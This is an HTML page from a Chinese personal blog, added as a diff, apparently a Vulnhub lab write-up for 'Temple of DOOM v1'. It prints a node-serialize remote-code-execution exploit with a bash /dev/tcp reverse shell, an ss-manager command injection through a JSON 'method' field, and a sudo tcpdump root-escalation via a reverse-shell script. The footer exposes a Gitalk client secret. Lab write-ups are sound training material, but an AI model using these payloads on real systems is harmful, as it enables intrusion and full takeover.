@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-25temple-of-DOOM-v1 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-25temple-of-DOOM-v1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 1, 2024&nbsp;&nbsp;16:07:02</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="25-temple-of-DOOM-v1"><a href="#25-temple-of-DOOM-v1" class="headerlink" title="25-temple-of-DOOM-v1"></a>25-temple-of-DOOM-v1</h1><p><img src="/vulnhub-25temple-of-doom-v1//image-20241201160806473.png" alt="image-20241201160806473"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.240.133</span>     nmap --min-rate <span class="number">100000</span> -p22,<span class="number">666</span> -A <span class="number">192.168.240.133</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.240.133</span>   dirb  http://<span class="number">192.168.240.133</span>/      nikto -host <span class="number">192.168.240.133</span> -p <span class="number">666</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">22</span>/tcp  open  ssh</span><br><span class="line"><span class="number">666</span>/tcp open  doom</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Nmap scan <span class="keyword">report</span> <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">240.133</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00036</span>s latency).</span><br><span class="line"></span><br><span class="line"><span class="keyword">PORT</span>    STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh     OpenSSH <span class="number">7.7</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   <span class="number">2048</span> <span class="number">95</span>:<span class="number">68</span>:<span class="number">04</span>:c7:<span class="number">42</span>:<span class="number">03</span>:<span class="number">04</span>:cd:<span class="number">00</span>:<span class="number">4</span>e:<span class="number">36</span>:<span class="number">7</span>e:cd:<span class="number">4</span>f:<span class="number">66</span>:ea (RSA)</span><br><span class="line">|   <span class="number">256</span> c3:<span class="number">06</span>:<span class="number">5</span>f:<span class="number">7</span>f:<span class="number">17</span>:b6:cb:bc:<span class="number">79</span>:<span class="number">6</span>b:<span class="number">46</span>:<span class="number">46</span>:cc:<span class="number">11</span>:<span class="number">3</span>a:<span class="number">7</span>d (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">63</span>:<span class="number">0</span>c:<span class="number">28</span>:<span class="number">88</span>:<span class="number">25</span>:d5:<span class="number">48</span>:<span class="number">19</span>:<span class="number">82</span>:bb:bd:<span class="number">72</span>:c6:<span class="number">6</span>c:<span class="number">68</span>:<span class="number">50</span> (ED25519)</span><br><span class="line"><span class="number">666</span>/tcp <span class="keyword">open</span>  http    Node.js Express framework</span><br><span class="line">|_http-title: Site doesn<span class="symbol">&#x27;t</span> have a title (<span class="literal">text</span>/html; charset=utf-<span class="number">8</span>).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D8:<span class="number">5</span>F:B7 (VMware)</span><br><span class="line"><span class="literal">Warning</span>: OSScan results may be unreliable because we could <span class="keyword">not</span> find at least <span class="number">1</span> <span class="keyword">open</span> <span class="keyword">and</span> <span class="number">1</span> closed <span class="keyword">port</span></span><br><span class="line">Device <span class="keyword">type</span>: general purpose</span><br><span class="line">Running: Linux <span class="number">3</span>.X|<span class="number">4</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">240.133</span>:<span class="number">666</span> [<span class="number">200</span> OK] Cookies[profile], Country[RESERVED][ZZ], HttpOnly[profile], IP[<span class="number">192.168</span>.<span class="number">240.133</span>], X-Powered-By[Express]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿penetration)-[/home/kali]</span><br><span class="line">└─# nikto -host <span class="number">192.168</span>.<span class="number">240.133</span> -p <span class="number">666</span></span><br><span class="line">- Nikto v2.<span class="number">5.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span>.<span class="number">240.133</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span>.<span class="number">240.133</span></span><br><span class="line">+ Target <span class="keyword">Port</span>:        <span class="number">666</span></span><br><span class="line">+ Start <span class="built_in">Time</span>:         <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">16</span>:<span class="number">18</span>:<span class="number">10</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Server: No banner retrieved</span><br><span class="line">+ /: Retrieved x-powered-by header: Express.</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could allow the user agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-header/</span><br><span class="line">+ No CGI Directories found (<span class="keyword">use</span> &#x27;-C <span class="keyword">all</span>&#x27; <span class="keyword">to</span> <span class="keyword">force</span> check <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: GET, HEAD .</span><br><span class="line">+ /#wp-config.php#: #wp-config.php# <span class="keyword">file</span> found. This <span class="keyword">file</span> contains the credentials.</span><br><span class="line">+ <span class="number">8113</span> requests: <span class="number">11</span> <span class="literal">error</span>(s) <span class="keyword">and</span> <span class="number">5</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">16</span>:<span class="number">18</span>:<span class="number">24</span> (GMT8) (<span class="number">14</span> seconds)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="666端口"><a href="#666端口" class="headerlink" title="666端口"></a>666端口</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node.<span class="keyword">js </span>Express framework，寻找nodejs的漏洞</span><br><span class="line"> searchsploit nodejs</span><br><span class="line"> 需要用这个远程代码执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201165546980.png" alt="image-20241201165546980"></p>
+<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Node.JS - &#x27;node-serialize&#x27; Remote Code Execution (2)</span></span><br><span class="line"><span class="comment"># Exploit Author: UndeadLarva</span></span><br><span class="line"><span class="comment"># Software Link: https://www.npmjs.com/package/node-serialize</span></span><br><span class="line"><span class="comment"># Version: 0.0.4</span></span><br><span class="line"><span class="comment"># CVE: CVE-2017-5941</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = &#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">133</span>:<span class="number">666</span>/&#x27; <span class="comment"># change this</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="string">&quot;require(&#x27;http&#x27;).ServerResponse.prototype.end = (function (end) &#123;&quot;</span></span><br><span class="line"><span class="string">&quot;return function () &#123;&quot;</span></span><br><span class="line"><span class="string">&quot;[&#x27;close&#x27;, &#x27;connect&#x27;, &#x27;data&#x27;, &#x27;drain&#x27;, &#x27;end&#x27;, &#x27;error&#x27;, &#x27;lookup&#x27;, &#x27;timeout&#x27;, &#x27;&#x27;].forEach(this.socket.removeAllListeners.bind(this.socket));&quot;</span></span><br><span class="line"><span class="string">&quot;console.log(&#x27;still inside&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;const &#123; exec &#125; = require(&#x27;child_process&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;exec(&#x27;bash -i &gt;&amp; /dev/tcp/192.168.240.130/1111 0&gt;&amp;1&#x27;);&quot;</span> <span class="comment"># change this</span></span><br><span class="line"><span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;)(require(&#x27;http&#x27;).ServerResponse.prototype.end)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rce = &quot;_$$ND_FUNC$$_process.exit(0)&quot;</span></span><br><span class="line"><span class="comment"># code =&quot;_$$ND_FUNC$$_console.log(&#x27;behind you&#x27;)&quot;</span></span><br><span class="line">code = <span class="string">&quot;_$$ND_FUNC$$_&quot;</span> + payload</span><br><span class="line"></span><br><span class="line"><span class="type">string</span> = &#x27;&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;TheUndead&quot;</span>,<span class="string">&quot;country&quot;</span>:<span class="string">&quot;worldwide&quot;</span>,<span class="string">&quot;city&quot;</span>:<span class="string">&quot;Tyr&quot;</span>, <span class="string">&quot;exec&quot;</span>: <span class="string">&quot;&#x27;+code+&#x27;&quot;</span>&#125;&#x27;</span><br><span class="line"></span><br><span class="line">cookie = &#123;&#x27;profile&#x27;:base64.b64encode(<span class="type">string</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url, cookies=cookie).text</span><br><span class="line">    print response</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.<span class="type">RequestException</span> <span class="keyword">as</span> e:</span><br><span class="line">    print(&#x27;<span class="type">Oops</span>!&#x27;)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201170453466.png" alt="image-20241201170453466"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在<span class="keyword">ls</span> /home 发现了fireman账号</span><br><span class="line"><span class="keyword">ps</span> aux | <span class="keyword">grep</span> fireman  查看该账号有没有能够提权的进程</span><br><span class="line">这个是用root权限开启的多用户管理进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201170851223.png" alt="image-20241201170851223"></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在当前shell中 用nc监听本地的<span class="number">8839</span>端口(UDP)  nc -u <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">8839</span>  接着执行<span class="keyword">add</span>: <span class="comment">&#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||touch /tmp/evil||&quot;&#125;</span>   这时看一下/tmp就能发现多了一个evil,<span class="keyword">method</span>后面的是命令执行，换成反弹<span class="title function_">shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201175108618.png" alt="image-20241201175108618"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（ss-manager）为fireman用户所有，所以我们可以利用该漏洞再次进行反弹<span class="keyword">shell</span>操作</span><br><span class="line">这样我们就可以获取到fireman用户，我们nc -lvp <span class="number">1113</span>监听<span class="number">1113</span>端口</span><br><span class="line">在<span class="keyword">shell</span>里输入<span class="built_in">add</span>: &#123;<span class="string">&quot;server_port&quot;</span>:<span class="number">8004</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>, <span class="string">&quot;method&quot;</span>:<span class="string">&quot;||bash -i &gt;&amp; /dev/tcp/192.168.240.130/1113 0&gt;&amp;1||&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">我弹了好几次才弹上，现在拿到fireman的权限了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201180352155.png" alt="image-20241201180352155"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l查找能提权的文件  tcpdump有相关提权漏洞，https://gtfobins.github.io/这个网站能搜索提权命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201180534057.png" alt="image-20241201180534057"></p>
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201180735037.png" alt="image-20241201180735037"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们有sudo权限，用sudo那个。该提权方法同样也是通过反弹<span class="keyword">shell</span>进行提权，先在文件中写入反弹<span class="keyword">shell</span>（同样需要一个未被占用的端口进行监听），将文件写入到/tmp目录下（该目录下通常权限较高）</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.240.130/1114 0&gt;&amp;1&quot;</span> &gt; /tmp/<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">nc -lvvp <span class="number">1114</span> （攻击机监听）</span><br><span class="line">我们需要对提供的命令进行小幅度修改</span><br><span class="line">sudo tcpdump -<span class="keyword">ln</span> -i <span class="keyword">lo</span> -<span class="keyword">w</span> /dev/null -W <span class="number">1</span> -G <span class="number">1</span> -<span class="keyword">z</span> /tmp/<span class="keyword">shell</span>.<span class="keyword">sh</span> -Z root</span><br><span class="line">sudo tcpdump -<span class="keyword">ln</span> -i eth0 -<span class="keyword">w</span> /dev/null -W <span class="number">1</span> -G <span class="number">1</span> -<span class="keyword">z</span> /tmp/<span class="keyword">shell</span>.<span class="keyword">sh</span> -Z root  修改了网口，<span class="keyword">lo</span>是本地localhost，eth0是外部网卡</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201181430554.png" alt="image-20241201181430554"></p>
+<p><img src="/vulnhub-25temple-of-doom-v1//image-20241201181458635.png" alt="image-20241201181458635"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-26pinky-s-palace-1/">Vulnhub-26Pinky.s-Palace-1</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-24-minu-1/">Vulnhub-24-MINU-1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
